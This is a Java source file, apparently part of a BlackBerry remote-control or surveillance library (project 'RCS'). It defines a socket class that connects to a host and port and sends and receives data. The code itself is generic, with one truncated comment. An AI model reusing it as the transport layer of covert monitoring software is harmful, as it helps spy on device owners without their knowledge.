/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : SocketConnection.java 
 * Created      : 26-mar-2010
 * *************************************************/
package com.ht.rcs.blackberry.transfer;

import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;

import javax.microedition.io.Connector;
import javax.microedition.io.StreamConnection;

import com.ht.rcs.blackberry.utils.Utils;

public class SocketConnection extends Connection {

    private String host;
    private int port;

    boolean isDirectTCP = true;

    // Constructor
    public SocketConnection(String host, int port) {
        this.host = host;
        this.port = port;
    }

    public boolean connect() {
        String url = "socket://" + host + ":" + port
                + (isDirectTCP ? ";deviceside=true" : "");

        try {
            connection = (StreamConnection) Connector.open(url);
            _in = new InputStreamReader(connection.openInputStream());
            _out = new OutputStreamWriter(connection.openOutputStream());
        } catch (IOException e) {
            return false;
        }

        return true;
    }

    /**
     * Pass some data to the server and wait for a response.
     * 
     * @param data
     *            The data to send.
     */
    public byte[] sendAndReceive(char[] data) throws IOException {
        // Cache the length locally for better efficiency.
        int length = data.length;

        // Create an input array just big enough to hold the data
        // (we're expecting the same string back that we send).
        char[] input = new char[length];
        _out.write(data, 0, length);

        // Read character by character into the input array.
        for (int i = 0; i < length; ++i) {
            input[i] = (char) _in.read();
        }

        // Hand the data to the parent class for updating the GUI. By explicitly
        return Utils.CharArrayToByteArray(input);

    }
}
